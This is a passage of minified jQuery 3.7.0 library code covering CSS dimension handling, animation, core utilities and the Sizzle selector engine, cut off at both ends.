0;for(;s<4;s+=2)"margin"===n&&(c+=Tt.css(t,n+te[s],!0,o)),i?("content"===n&&(l-=Tt.css(t,"padding"+te[s],!0,o)),"margin"!==n&&(l-=Tt.css(t,"border"+te[s]+"Width",!0,o))):(l+=Tt.css(t,"padding"+te[s],!0,o),"padding"!==n?l+=Tt.css(t,"border"+te[s]+"Width",!0,o):a+=Tt.css(t,"border"+te[s]+"Width",!0,o));return!i&&r>=0&&(l+=Math.max(0,Math.ceil(t["offset"+e[0].toUpperCase()+e.slice(1)]-r-l-a-.5))||0),l+c}function F(t,e,n){var i=be(t),o=(!vt.boxSizingReliable()||n)&&"border-box"===Tt.css(t,"boxSizing",!1,i),s=o,a=B(t,e,i),l="offset"+e[0].toUpperCase()+e.slice(1);if(ve.test(a)){if(!n)return a;a="auto"}return(!vt.boxSizingReliable()&&o||!vt.reliableTrDimensions()&&r(t,"tr")||"auto"===a||!parseFloat(a)&&"inline"===Tt.css(t,"display",!1,i))&&t.getClientRects().length&&(o="border-box"===Tt.css(t,"boxSizing",!1,i),(s=l in t)&&(a=t[l])),(a=parseFloat(a)||0)+q(t,e,n||(o?"border":"content"),s,i,a)+"px"}function W(t,e,n,i,o){return new W.prototype.init(t,e,n,i,o)}function z(){Ae&&(!1===xt.hidden&&t.requestAnimationFrame?t.requestAnimationFrame(z):t.setTimeout(z,Tt.fx.interval),Tt.fx.tick())}function V(){return t.setTimeout((function(){je=void 0})),je=Date.now()}function U(t,e){var n,i=0,o={height:t};for(e=e?1:0;i<4;i+=2-e)o["margin"+(n=te[i])]=o["padding"+n]=t;return e&&(o.opacity=o.width=t),o}function X(t,e,n){for(var i,o=(K.tweeners[e]||[]).concat(K.tweeners["*"]),r=0,s=o.length;r<s;r++)if(i=o[r].call(n,e,t))return i}function K(t,e,n){var i,o,r=0,s=K.prefilters.length,a=Tt.Deferred().always((function(){delete l.elem})),l=function(){if(o)return!1;for(var e=je||V(),n=Math.max(0,c.startTime+c.duration-e),i=1-(n/c.duration||0),r=0,s=c.tweens.length;r<s;r++)c.tweens[r].run(i);return a.notifyWith(t,[c,i,n]),i<1&&s?n:(s||a.notifyWith(t,[c,1,0]),a.resolveWith(t,[c]),!1)},c=a.promise({elem:t,props:Tt.extend({},e),opts:Tt.extend(!0,{specialEasing:{},easing:Tt.easing._default},n),originalProperties:e,originalOptions:n,startTime:je||V(),duration:n.duration,tweens:[],createTween:function(e,n){var i=Tt.Tween(t,c.opts,e,n,c.opts.specialEasing[e]||c.opts.easing);return c.tweens.push(i),i},stop:function(e){var n=0,i=e?c.tweens.length:0;if(o)return this;for(o=!0;n<i;n++)c.tweens[n].run(1);return e?(a.notifyWith(t,[c,1,0]),a.resolveWith(t,[c,e])):a.rejectWith(t,[c,e]),this}}),u=c.props;for(function Q(t,e){var n,i,o,r,s;for(n in t)if(o=e[i=m(n)],r=t[n],Array.isArray(r)&&(o=r[1],r=t[n]=r[0]),n!==i&&(t[i]=r,delete t[n]),(s=Tt.cssHooks[i])&&"expand"in s)for(n in r=s.expand(r),delete t[i],r)n in t||(t[n]=r[n],e[n]=o);else e[i]=o}(u,c.opts.specialEasing);r<s;r++)if(i=K.prefilters[r].call(c,t,u,c.opts))return yt(i.stop)&&(Tt._queueHooks(c.elem,c.opts.queue).stop=i.stop.bind(i)),i;return Tt.map(u,X,c),yt(c.opts.start)&&c.opts.start.call(t,c),c.progress(c.opts.progress).done(c.opts.done,c.opts.complete).fail(c.opts.fail).always(c.opts.always),Tt.fx.timer(Tt.extend(l,{elem:t,anim:c,queue:c.opts.queue})),c}function G(t){return(t.match(qt)||[]).join(" ")}function Z(t){return t.getAttribute&&t.getAttribute("class")||""}function J(t){return Array.isArray(t)?t:"string"==typeof t&&t.match(qt)||[]}function tt(t,e,n,o){var r;if(Array.isArray(e))Tt.each(e,(function(e,i){n||Fe.test(t)?o(t,i):tt(t+"["+("object"==typeof i&&null!=i?e:"")+"]",i,n,o)}));else if(n||"object"!==i(e))o(t,e);else for(r in e)tt(t+"["+r+"]",e[r],n,o)}function et(t){return function(e,n){"string"!=typeof e&&(n=e,e="*");var i,o=0,r=e.toLowerCase().match(qt)||[];if(yt(n))for(;i=r[o++];)"+"===i[0]?(i=i.slice(1)||"*",(t[i]=t[i]||[]).unshift(n)):(t[i]=t[i]||[]).push(n)}}function nt(t,e,n,i){function o(a){var l;return r[a]=!0,Tt.each(t[a]||[],(function(t,a){var c=a(e,n,i);return"string"!=typeof c||s||r[c]?s?!(l=c):void 0:(e.dataTypes.unshift(c),o(c),!1)})),l}var r={},s=t===tn;return o(e.dataTypes[0])||!r["*"]&&o("*")}function it(t,e){var n,i,o=Tt.ajaxSettings.flatOptions||{};for(n in e)void 0!==e[n]&&((o[n]?t:i||(i={}))[n]=e[n]);return i&&Tt.extend(!0,t,i),t}var st=[],at=Object.getPrototypeOf,lt=st.slice,ct=st.flat?function(t){return st.flat.call(t)}:function(t){return st.concat.apply([],t)},ut=st.push,ht=st.indexOf,dt={},pt=dt.toString,ft=dt.hasOwnProperty,mt=ft.toString,gt=mt.call(Object),vt={},yt=function(t){return"function"==typeof t&&"number"!=typeof t.nodeType&&"function"!=typeof t.item},bt=function(t){return null!=t&&t===t.window},xt=t.document,wt={type:!0,src:!0,nonce:!0,noModule:!0},kt=/HTML$/i,Tt=function(t,e){return new Tt.fn.init(t,e)};Tt.fn=Tt.prototype={jquery:"3.7.0",constructor:Tt,length:0,toArray:function(){return lt.call(this)},get:function(t){return null==t?lt.call(this):t<0?this[t+this.length]:this[t]},pushStack:function(t){var e=Tt.merge(this.constructor(),t);return e.prevObject=this,e},each:function(t){return Tt.each(this,t)},map:function(t){return this.pushStack(Tt.map(this,(function(e,n){return t.call(e,n,e)})))},slice:function(){return this.pushStack(lt.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},even:function(){return this.pushStack(Tt.grep(this,(function(t,e){return(e+1)%2})))},odd:function(){return this.pushStack(Tt.grep(this,(function(t,e){return e%2})))},eq:function(t){var e=this.length,n=+t+(t<0?e:0);return this.pushStack(n>=0&&n<e?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:ut,sort:st.sort,splice:st.splice},Tt.extend=Tt.fn.extend=function(){var t,e,n,i,o,r,s=arguments[0]||{},a=1,l=arguments.length,c=!1;for("boolean"==typeof s&&(c=s,s=arguments[a]||{},a++),"object"==typeof s||yt(s)||(s={}),a===l&&(s=this,a--);a<l;a++)if(null!=(t=arguments[a]))for(e in t)i=t[e],"__proto__"!==e&&s!==i&&(c&&i&&(Tt.isPlainObject(i)||(o=Array.isArray(i)))?(n=s[e],r=o&&!Array.isArray(n)?[]:o||Tt.isPlainObject(n)?n:{},o=!1,s[e]=Tt.extend(c,r,i)):void 0!==i&&(s[e]=i));return s},Tt.extend({expando:"jQuery"+("3.7.0"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(t){throw new Error(t)},noop:function(){},isPlainObject:function(t){var e,n;return!(!t||"[object Object]"!==pt.call(t)||(e=at(t))&&("function"!=typeof(n=ft.call(e,"constructor")&&e.constructor)||mt.call(n)!==gt))},isEmptyObject:function(t){var e;for(e in t)return!1;return!0},globalEval:function(t,e,i){n(t,{nonce:e&&e.nonce},i)},each:function(t,e){var n,i=0;if(o(t))for(n=t.length;i<n&&!1!==e.call(t[i],i,t[i]);i++);else for(i in t)if(!1===e.call(t[i],i,t[i]))break;return t},text:function(t){var e,n="",i=0,o=t.nodeType;if(o){if(1===o||9===o||11===o)return t.textContent;if(3===o||4===o)return t.nodeValue}else for(;e=t[i++];)n+=Tt.text(e);return n},makeArray:function(t,e){var n=e||[];return null!=t&&(o(Object(t))?Tt.merge(n,"string"==typeof t?[t]:t):ut.call(n,t)),n},inArray:function(t,e,n){return null==e?-1:ht.call(e,t,n)},isXMLDoc:function(t){var e=t&&t.namespaceURI,n=t&&(t.ownerDocument||t).documentElement;return!kt.test(e||n&&n.nodeName||"HTML")},merge:function(t,e){for(var n=+e.length,i=0,o=t.length;i<n;i++)t[o++]=e[i];return t.length=o,t},grep:function(t,e,n){for(var i=[],o=0,r=t.length,s=!n;o<r;o++)!e(t[o],o)!==s&&i.push(t[o]);return i},map:function(t,e,n){var i,r,s=0,a=[];if(o(t))for(i=t.length;s<i;s++)null!=(r=e(t[s],s,n))&&a.push(r);else for(s in t)null!=(r=e(t[s],s,n))&&a.push(r);return ct(a)},guid:1,support:vt}),"function"==typeof Symbol&&(Tt.fn[Symbol.iterator]=st[Symbol.iterator]),Tt.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),(function(t,e){dt["[object "+e+"]"]=e.toLowerCase()}));var Ct=st.pop,St=st.sort,Et=st.splice,jt="[\\x20\\t\\r\\n\\f]",At=new RegExp("^"+jt+"+|((?:^|[^\\\\])(?:\\\\.)*)"+jt+"+$","g");Tt.contains=function(t,e){var n=e&&e.parentNode;return t===n||!(!n||1!==n.nodeType||!(t.contains?t.contains(n):t.compareDocumentPosition&&16&t.compareDocumentPosition(n)))};var Mt=/([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g;Tt.escapeSelector=function(t){return(t+"").replace(Mt,s)};var Dt=xt,Lt=ut;!function(){function n(t,e,i,o){var r,s,a,l,c,u,p,g=e&&e.ownerDocument,v=e?e.nodeType:9;if(i=i||[],"string"!=typeof t||!t||1!==v&&9!==v&&11!==v)return i;if(!o&&(d(e),e=e||M,L)){if(11!==v&&(c=it.exec(t)))if(r=c[1]){if(9===v){if(!(a=e.getElementById(r)))return i;if(a.id===r)return O.call(i,a),i}else if(g&&(a=g.getElementById(r))&&n.contains(e,a)&&a.id===r)return O.call(i,a),i}else{if(c[2])return O.apply(i,e.getElementsByTagName(t)),i;if((r=c[3])&&e.getElementsByClassName)return O.apply(i,e.getElementsByClassName(r)),i}if(!(F[t+" "]||P&&P.test(t))){if(p=t,g=e,1===v&&(G.test(t)||K.test(t))){for((g=ot.test(t)&&h(e.parentNode)||e)==e&&vt.scope||((l=e.getAttribute("id"))?l=Tt.escapeSelector(l):e.setAttribute("id",l=B)),s=(u=f(t)).length;s--;)u[s]=(l?"#"+l:":scope")+" "+m(u[s]);p=u.join(",")}try{return O.apply(i,g.querySelectorAll(p)),i}catch(y){F(t,!0)}finally{l===B&&e.removeAttribute("id")}}}return T(t.replace(At,"$1"),e,i,o)}function i(){var e=[];return function t(n,i){return e.push(n+" ")>S.cacheLength&&delete t[e.shift()],t[n+" "]=i}}function o(t){return t[B]=!0,t}function s(t){var e=M.createElement("fieldset");try{return!!t(e)}catch(n){return!1}finally{e.parentNode&&e.parentNode.removeChild(e),e=null}}function a(t){return function(e){return r(e,"input")&&e.type===t}}function l(t){return function(e){return(r(e,"input")||r(e,"button"))&&e.type===t}}function c(t){return function(e){return"form"in e?e.parentNode&&!1===e.disabled?"label"in e?"label"in e.parentNode?e.parentNode.disabled===t:e.disabled===t:e.isDisabled===t||e.isDisabled!==!t&&ut(e)===t:e.disabled===t:"label"in e&&e.disabled===t}}function u(t){return o((function(e){return e=+e,o((function(n,i){for(var o,r=t([],n.length,e),s=r.length;s--;)n[o=r[s]]&&(n[o]=!(i[o]=n[o]))}))}))}function h(t){return t&&void 0!==t.getElementsByTagName&&t}function d(t){var e,i=t?t.ownerDocument||t:Dt;return i!=M&&9===i.nodeType&&i.documentElement?(D=(M=i).documentElement,L=!Tt.isXMLDoc(M),$=D.matches||D.webkitMatchesSelector||D.msMatchesSelector,Dt!=M&&(e=M.defaultView)&&e.top!==e&&e.addEventListener("unload",ct),vt.getById=s((function(t){return D.appendChild(t).id=Tt.expando,!M.getElementsByName||!M.getElementsByName(Tt.expando).length})),vt.disconnectedMatch=s((function(t){return $.call(t,"*")})),vt.scope=s((function(){return M.querySelectorAll(":scope")})),vt.cssHas=s((function(){try{return M.querySelector(":has(*,:jqfake)"),!1}catch(t){return!0}})),vt.getById?(S.filter.ID=function(t){var e=t.replace(rt,at);return function(t){return t.getAttribute("id")===e}},S.find.ID=function(t,e){if(void 0!==e.getElementById&&L){var n=e.getElementById(t);return n?[n]:[]}}):(S.filter.ID=function(t){var e=t.replace(rt,at);return function(t){var n=void 0!==t.getAttributeNode&&t.getAttributeNode("id");return n&&n.value===e}},S.find.ID=function(t,e){if(void 0!==e.getElementById&&L){var n,i,o,r=e.getElementById(t);if(r){if((n=r.getAttributeNode("id"))&&n.value===t)return[r];for(o=e.getElementsByName(t),i=0;r=o[i++];)if((n=r.getAttributeNode("id"))&&n.value===t)return[r]}return[]}}),S.find.TAG=function(t,e){return void 0!==e.getElementsByTagName?e.getElementsByTagName(t):e.querySelectorAll(t)},S.find.CLASS=function(t,e){if(void 0!==e.getElementsByClassName&&L)return e.getElementsByClassName(t)},P=[],s((function(t){var e;D.appendChild(t).innerHTML="<a id='"+B+"' href='' disabled='disabled'></a><select id='"+B+"-\r\\' disabled='disabled'><option selected=''></option></select>",t.querySelectorAll("[selected]").length||P.push("\\["+jt+"*(?:value|"+z+")"),t.querySelectorAll("[id~="+B+"-]").length||P.push("~="),t.querySelectorAll("a#"+B+"+*").length||P.push(".#.+[+~]"),t.querySelectorAll(":checked").length||P.push(":checked"),(e=M.createElement("input")).setAttribute("type","hidden"),t.appendChild(e).setAttribute("name","D"),D.appendChild(t).disabled=!0,2!==t.querySelectorAll(":disabled").length&&P.push(":enabled",":disabled"),(e=M.createElement("input")).setAttribute("name",""),t.appendChild(e),t.querySelectorAll("[name='']").length||P.push("\\["+jt+"*name"+jt+"*="+jt+"*(?:''|\"\")")})),vt.cssHas||P.push(":has"),P=P.length&&new RegExp(P.join("|")),W=function(t,e){if(t===e)return A=!0,0;var i=!t.compareDocumentPosition-!e.compareDocumentPosition;return i||(1&(i=(t.ownerDocument||t)==(e.ownerDocument||e)?t.compareDocumentPosition(e):1)||!vt.sortDetached&&e.compareDocumentPosition(t)===i?t===M||t.ownerDocument==Dt&&n.contains(Dt,t)?-1:e===M||e.ownerDocument==Dt&&n.contains(Dt,e)?1:j?ht.call(j,t)-ht.call(j,e):0:4&i?-1:1)},M):M}function p(){}function f(t,e){var i,o,r,s,a,l,c,u=H[t+" "];if(u)return e?0:u.slice(0);for(a=t,l=[],c=S.preFilter;a;){for(s in i&&!(o=Q.exec(a))||(o&&(a=a.slice(o[0].length)||a),l.push(r=[])),i=!1,(o=K.exec(a))&&(i=o.shift(),r.push({value:i,type:o[0].replace(At," ")}),a=a.slice(i.length)),S.filter)!(o=tt[s].exec(a))||c[s]&&!(o=c[s](o))||(i=o.shift(),r.push({value:i,type:s,matches:o}),a=a.slice(i.length));if(!i)break}return e?a.length:a?n.error(t):H(t,l).slice(0)}function m(t){for(var e=0,n=t.length,i="";e<n;e++)i+=t[e].value;return i}function g(t,e,n){var i=e.dir,o=e.next,s=o||i,a=n&&"parentNode"===s,l=N++;return e.first?function(e,n,o){for(;e=e[i];)if(1===e.nodeType||a)return t(e,n,o);return!1}:function(e,n,c){var u,h,d=[I,l];if(c){for(;e=e[i];)if((1===e.nodeType||a)&&t(e,n,c))return!0}else for(;e=e[i];)if(1===e.nodeType||a)if(h=e[B]||(e[B]={}),o&&r(e,o))e=e[i]||e;else{if((u=h[s])&&u[0]===I&&u[1]===l)return d[2]=u[2];if(h[s]=d,d[2]=t(e,n,c))return!0}return!1}}function v(t){return t.length>1?function(e,n,i){for(var o=t.length;o--;)if(!t[o](e,n,i))return!1;return!0}:t[0]}function y(t,e,i){for(var o=0,r=e.length;o<r;o++)n(t,e[o],i);return i}function b(t,e,n,i,o){for(var r,s=[],a=0,l=t.length,c=null!=e;a<l;a++)(r=t[a])&&(n&&!n(r,i,o)||(s.push(r),c&&e.push(a)));return s}function x(t,e,n,i,r,s){return i&&!i[B]&&(i=x(i)),r&&!r[B]&&(r=x(r,s)),o((function(o,s,a,l){var c,u,h,d,p=[],f=[],m=s.length,g=o||y(e||"*",a.nodeType?[a]:a,[]),v=!t||!o&&e?g:b(g,p,t,a,l);if(n?n(v,d=r||(o?t:m||i)?[]:s,a,l):d=v,i)for(c=b(d,f),i(c,[],a,l),u=c.length;u--;)(h=c[u])&&(d[f[u]]=!(v[f[u]]=h));if(o){if(r||t){if(r){for(c=[],u=d.length;u--;)(h=d[u])&&c.push(v[u]=h);r(null,d=[],c,l)}for(u=d.length;u--;)(h=d[u])&&(c=r?ht.call(o,h):p[u])>-1&&(o[c]=!(s[c]=h))}}else d=b(d===s?d.splice(m,d.length):d),r?r(null,s,d,l):O.apply(s,d)}))}function w(t){for(var e,n,i,o=t.length,r=S.relative[t[0].type],s=r||S.relative[" "],a=r?1:0,l=g((function(t){return t===e}),s,!0),c=g((function(t){return ht.call(e,t)>-1}),s,!0),u=[function(t,n,i){var o=!r&&(i||n!=E)||((e=n).nodeType?l(t,n,i):c(t,n,i));return e=null,o}];a<o;a++)if(n=S.relative[t[a].type])u=[g(v(u),n)];else{if((n=S.filter[t[a].type].apply(null,t[a].matches))[B]){for(i=++a;i<o&&!S.relative[t[i].type];i++);return x(a>1&&v(u),a>1&&m(t.slice(0,a-1).concat({value:" "===t[a-2].type?"*":""})).replace(At,"$1"),n,a<i&&w(t.slice(a,i)),i<o&&w(t=t.slice(i)),i<o&&m(t))}u.push(n)}return v(u)}function _(t,e){var n=e.length>0,i=t.length>0,r=function(o,r,s,a,l){var c,u,h,p=0,f="0",m=o&&[],g=[],v=E,y=o||i&&S.find.TAG("*",l),x=I+=null==v?1:Math.random()||.1,w=y.length;for(l&&(E=r==M||r||l);f!==w&&null!=(c=y[f]);f++){if(i&&c){for(u=0,r||c.ownerDocument==M||(d(c),s=!L);h=t[u++];)if(h(c,r||M,s)){O.call(a,c);break}l&&(I=x)}n&&((c=!h&&c)&&p--,o&&m.push(c))}if(p+=f,n&&f!==p){for(u=0;h=e[u++];)h(m,g,r,s);if(o){if(p>0)for(;f--;)m[f]||g[f]||(g[f]=Ct.call(a));g=b(g)}O.apply(a,g),l&&!o&&g.length>0&&p+e.length>1&&Tt.uniqueSort(a)}return l&&(I=x,E=v),m};return n?o(r):r}function k(t,e){var n,i=[],o=[],r=q[t+" "];if(!r){for(e||(e=f(t)),n=e.length;n--;)(r=w(e[n]))[B]?i.push(r):o.push(r);(r=q(t,_(o,i))).selector=t}return r}function T(t,e,n,i){var o,r,s,a,l,c="function"==typeof t&&t,u=!i&&f(t=c.selector||t);if(n=n||[],1===u.length){if((r=u[0]=u[0].slice(0)).length>2&&"ID"===(s=r[0]).type&&9===e.nodeType&&L&&S.relative[r[1].type]){if(!(e=(S.find.ID(s.matches[0].replace(rt,at),e)||[])[0]))return n;c&&(e=e.parentNode),t=t.slice(r.shift().value.length)}for(o=tt.needsContext.test(t)?0:r.length;o--&&(s=r[o],!S.relative[a=s.type]);)if((l=S.find[a])&&(i=l(s.matches[0].replace(rt,at),ot.test(r[0].type)&&h(e.parentNode)||e))){if(r.splice(o,1),!(t=i.length&&m(r)))return O.apply(n,i),n;break}}return(c||k(t,u))(i,e,!L,n,!e||ot.test(t)&&h(e.parentNode)||e),n}var C,S,E,j,A,M,D,L,P,$,O=Lt,B=Tt.expando,I=0,N=0,R=i(),H=i(),q=i(),F=i(),W=function(t,e){return t===e&&(A=!0),0},z="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",V="(?:\\\\[\\da-fA-F]{1,6}"+jt+"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",U="\\["+jt+"*("+V+")(?:"+jt+"*([*^$|!~]?=)"+jt+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+V+"))|)"+jt+"*\\]",X=":("+V+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+U+")*)|.*)\\)|)",Y=new RegExp(jt+"+","g"),Q=new RegExp("^"+jt+"*,"+jt+"*"),K=new RegExp("^"+jt+"*([>+~]|"+jt+")"+jt+"*"),G=new RegExp(jt+"|>"),Z=new RegExp(X),J=new RegExp("^"+V+"$"),tt={ID:new RegExp("^#("+V+")"),CLASS:new RegExp("^\\.("+V+")"),TAG:new RegExp("^("+V+"|[*])"),ATTR:new RegExp("^"+U),PSEUDO:new RegExp("^"+X),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+jt+"*(even|odd|(([+-]|)(\\d*)n|)"+jt+"*(?:([+-]|)"+jt+"*(\\d+)|))"+jt+"*\\)|)","i"),bool:new RegExp("^(?:"+z+")$","i"),needsContext:new RegExp("^"+jt+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+jt+"*((?:-\\d)?\\d*)"+jt+"*\\)|)(?=[^-]|$)","i")},et=/^(?:input|select|textarea|button)$/i,nt=/^h\d$/i,it=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ot=/[+~]/,rt=new RegExp("\\\\[\\da-fA-F]{1,6}"+jt+"?|\\\\([^\\r\\n\\f])","g"),at=function(t,e){var n="0x"+t.slice(1)-65536;return e||(n<0?String.fromCharCode(n+65536):String.fromCharCode(n>>10|55296,1023&n|56320))},ct=function(){d()},ut=g((function(t){return!0===t.disabled&&r(t,"fieldset")}),{dir:"parentNode",next:"legend"});try{O.apply(st=lt.call(Dt.childNodes),Dt.childNodes),st[Dt.childNodes.length].nodeType}catch(dt){O={apply:function(t,e){Lt.apply(t,lt.call(e))},call:function(t){Lt.apply(t,lt.call(arguments,1))}}}for(C in n.matches=function(t,e){return n(t,null,null,e)},n.matchesSelector=function(t,e){if(d(t),L&&!F[e+" "]&&(!P||!P.test(e)))try{var i=$.call(t,e);if(i||vt.disconnectedMatch||t.document&&11!==t.document.nodeType)return i}catch(dt){F(e,!0)}return n(e,M,null,[t]).length>0},n.contains=function(t,e){return(t.ownerDocument||t)!=M&&d(t),Tt.contains(t,e)},n.attr=function(t,e){(t.ownerDocument||t)!=M&&d(t);var n=S.attrHandle[e.toLowerCase()],i=n&&ft.call(S.attrHandle,e.toLowerCase())?n(t,e,!L):void 0;return void 0!==i?i:t.getAttribute(e)},n.error=function(t){throw new Error("Syntax error, unrecognized expression: "+t)},Tt.uniqueSort=function(t){var e,n=[],i=0,o=0;if(A=!vt.sortStable,j=!vt.sortStable&&lt.call(t,0),St.call(t,W),A){for(;e=t[o++];)e===t[o]&&(i=n.push(o));for(;i--;)Et.call(t,n[i],1)}return j=null,t},Tt.fn.uniqueSort=function(){return this.pushStack(Tt.uniqueSort(lt.apply(this)))},(S=Tt.expr={cacheLength:50,createPseudo:o,match:tt,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(t){return t[1]=t[1].replace(rt,at),t[3]=(t[3]||t[4]||t[5]||"").replace(rt,at),"~="===t[2]&&(t[3]=" "+t[3]+" "),t.slice(0,4)},CHILD:function(t){return t[1]=t[1].toLowerCase(),"nth"===t[1].slice(0,3)?(t[3]||n.error(t[0]),t[4]=+(t[4]?t[5]+(t[6]||1):2*("even"===t[3]||"odd"===t[3])),t[5]=+(t[7]+t[8]||"odd"===t[3])):t[3]&&n.error(t[0]),t},PSEUDO:function(t){var e,n=!t[6]&&t[2];return tt.CHILD.test(t[0])?null:(t[3]?t[2]=t[4]||t[5]||"":n&&Z.test(n)&&(e=f(n,!0))&&(e=n.indexOf(")",n.length-e)-n.length)&&(t[0]=t[0].slice(0,e),t[2]=n.slice(0,e)),t.slice(0,3))}},filter:{TAG:function(t){var e=t.replace(rt,at).toLowerCase();return"*"===t?function(){return!0}:function(t){return r(t,e)}},CLASS:function(t){var e=R[t+" "];return e||(e=new RegExp("(^|"+jt+")"+t+"("+jt+"|$)"))&&R(t,(function(t){return e.test("string"==typeof t.className&&t.className||void 0!==t.getAttribute&&t.getAttribute("class")||"")}))},ATTR:function(t,e,i){return function(o){var r=n.attr(o,t);return null==r?"!="===e:!e||(r+="","="===e?r===i:"!="===e?r!==i:"^="===e?i&&0===r.indexOf(i):"*="===e?i&&r.indexOf(i)>-1:"$="===e?i&&r.slice(-i.length)===i:"~="===e?(" "+r.replace(Y," ")+" ").indexOf(i)>-1:"|="===e&&(r===i||r.slice(0,i.length+1)===i+"-"))}},CHILD:function(t,e,n,i,o){var s="nth"!==t.slice(0,3),a="last"!==t.slice(-4),l="of-type"===e;return 1===i&&0===o?function(t){return!!t.parentNode}:function(e,n,c){var u,h,d,p,f,m=s!==a?"nextSibling":"previousSibling",g=e.parentNode,v=l&&e.nodeName.toLowerCase(),y=!c&&!l,b=!1;if(g){if(s){for(;m;){for(d=e;d=d[m];)if(l?r(d,v):1===d.nodeType)return!1;f=m="only"===t&&!f&&"nextSibling"}return!0}if(f=[a?g.firstChild:g.lastChild],a&&y){for(b=(p=(u=(h=g[B]||(g[B]={}))[t]||[])[0]===I&&u[1])&&u[2],d=p&&g.childNodes[p];d=++p&&d&&d[m]||(b=p=0)||f.pop();)if(1===d.nodeType&&++b&&d===e){h[t]=[I,p,b];break}}else if(y&&(b=p=(u=(h=e[B]||(e[B]={}))[t]||[])[0]===I&&u[1]),!1===b)for(;(d=++p&&d&&d[m]||(b=p=0)||f.pop())&&((l?!r(d,v):1!==d.nodeType)||!++b||(y&&((h=d[B]||(d[B]={}))[t]=[I,b]),d!==e)););return(b-=o)===i||b%i==0&&b/i>=0}}},PSEUDO:function(t,e){var i,r=S.pseudos[t]||S.setFilters[t.toLowerCase()]||n.error("unsupported pseudo: "+t);return r[B]?r(e):r.length>1?(i=[t,t,"",e],S.setFilters.hasOwnProperty(t.toLowerCase())?o((function(t,n){for(var i,o=r(t,e),s=o.length;s--;)t[i=ht.call(t,o[s])]=!(n[i]=o[s])})):function(t){return r(t,0,i)}):r}},pseudos:{not:o((function(t){var e=[],n=[],i=k(t.replace(At,"$1"));return i[B]?o((function(t,e,n,o){for(var r,s=i(t,null,o,[]),a=t.length;a--;)(r=s[a])&&(t[a]=!(e[a]=r))})):function(t,o,r){return e[0]=t,i(e,null,r,n),e[0]=null,!n.pop()}})),has:o((function(t){return function(e){return n(t,e).length>0}})),contains:o((function(t){return t=t.replace(rt,at),function(e){return(e.textContent||Tt.text(e)).indexOf(t)>-1}})),lang:o((function(t){return J.test(t||"")||n.error("unsupported lang: "+t),t=t.replace(rt,at).toLowerCase(),function(e){var n;do{if(n=L?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(n=n.toLowerCase())===t||0===n.indexOf(t+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}})),target:function(e){var n=t.location&&t.location.hash;return n&&n.slice(1)===e.id},root:function(t){return t===D},focus:function(t){return t===function e(){try{return M.activeElement}catch(t){}}()&&M.hasFocus()&&!!(t.type||t.href||~t.tabIndex)},enabled:c(!1),disabled:c(!0),checked:function(t){return r(t,"input")&&!!t.checked||r(t,"option")&&!!t.selected},selected:function(t){return t.parentNode&&t.parentNode.selectedIndex,!0===t.selected},empty:function(t){for(t=t.firstChild;t;t=t.nextSibling)if(t.nodeType<6)return!1;return!0},parent:function(t){return!S.pseudos.empty(t)},header:function(t){return nt.test(t.nodeName)},input:function(t){return et.test(t.nodeName)},button:function(t){return r(t,"input")&&"button"===t.type||r(t,"button")},text:function(t){var e;return r(t,"input")&&"text"===t.type&&(null==(e=t.getAttribute("type"))||"text"===e.toLowerCase())},first:u((function(){return[0]})),last:u((function(t,e){return[e-1]})),eq:u((function(t,e,n){return[n<0?n+e:n]})),even:u((function(t,e){for(var n=0;n<e;n+=2)t.push(n);return t})),odd:u((function(t,e){for(var n=1;n<e;n+=2)t.push(n);return t})),lt:u((function(t,e,n){var i;for(i=n<0?n+e:n>e?e:n;--i>=0;)t.push(i);return t})),gt:u((function(t,e,n){for(var i=n<0?n+e:n;++i<e;)t.push(i);return t}))}}).pseudos.nth=S.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})S.pseudos[C]=a(C);for(C in{submit:!0,reset:!0})S.pseudos[C]=l(C);p.prototype=S.filters=S.pseudos,S.setFilters=new p,vt.sortStable=B.split("").sort(W).join("")===B,d(),vt.sortDetached=s((function(t){return 1&t.compareDocumentPosition(M.createElement("fieldset"))})),Tt.find=n,Tt.expr[":"]=Tt.expr.pseudos,Tt.unique=Tt.uniqueSort,n.compile=k,n.select=T,n.setDocument=d,n.escape=Tt.escapeSelector,n.getText=Tt.text,n.isXML=Tt.isXMLDoc,n.selectors=Tt.expr,n.support=Tt.support,n.uniqueSort=Tt.uniqueSort}();var Pt=function(t,e,n){for(var i=[],o=void 0!==n;(t=t[e])&&9!==t.nodeType;)if(1===t.nodeType){if(o&&Tt(t).is(n))break;i.push(t)}return i},$t=function(t,e){for(var n=[];t;t=t.nextSibling)1===t.nodeType&&t!==e&&n.push(t);return n},Ot=Tt.expr.match.needsContext,Bt=/^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;Tt.filter=function(t,e,n){var i=e[0];return n&&(t=":not("+t+")"),1===e.length&&1===i.nodeType?Tt.find.matchesSelector(i,t)?[i]:[]:Tt.find.matches(t,Tt.grep(e,(function(t){return 1===t.nodeType})))},Tt.fn.extend({find:function(t){var e,n,i=this.length,o=this;if("string"!=typeof t)return this.pushStack(Tt(t).filter((function(){for(e=0;e<i;e++)if(Tt.contains(o[e],this))return!0})));for(n=this.pushStack([]),e=0;e<i;e++)Tt.find(t,o[e],n);return i>1?Tt.uniqueSort(n):n},filter:function(t){return this.pushStack(a(this,t||[],!1))},not:function(t){return 